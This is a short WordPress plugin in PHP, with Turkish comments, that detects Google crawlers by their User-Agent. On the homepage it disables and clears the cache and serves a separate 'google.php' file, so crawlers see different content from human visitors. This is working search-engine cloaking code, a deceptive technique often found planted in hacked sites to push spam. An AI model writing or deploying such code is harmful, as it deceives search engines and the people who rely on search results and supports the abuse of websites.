<?php
/*
Plugin Name: Bot Yönlendirme ve Cache Engelleme
Description: Googlebotlara özel içerik sunar ve cache'i devre dışı bırakır.
*/

add_action('template_redirect', 'botlari_yakala_ve_cache_iptal_et');

function botlari_yakala_ve_cache_iptal_et() {
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        $bot_keywords = ['googlebot', 'googlebot-mobile', 'adsbot-google', 'googlebot-image', 'googlebot-news', 'googlebot-video'];
        
        foreach ($bot_keywords as $bot) {
            if (strpos($user_agent, $bot) !== false) {
                if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') {
                    // Cache'i tamamen durdur
                    define('DONOTCACHEPAGE', true);
                    if (function_exists('wp_cache_clear_cache')) {
                        wp_cache_clear_cache();
                    }
                    
                    // google.php'yi çağır
                    require ABSPATH . 'google.php';
                    exit;
                }
                break;
            }
        }
    }
}